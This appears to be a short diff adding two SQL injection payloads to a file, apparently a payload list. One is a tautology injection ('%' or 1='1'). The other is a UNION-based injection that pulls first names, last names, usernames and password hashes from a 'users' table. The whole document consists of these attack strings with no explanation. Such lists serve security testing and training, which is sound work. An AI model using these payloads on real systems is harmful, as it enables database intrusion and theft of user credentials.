@@ -1,0 +1,2 @@
+%' or 1='1
+' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
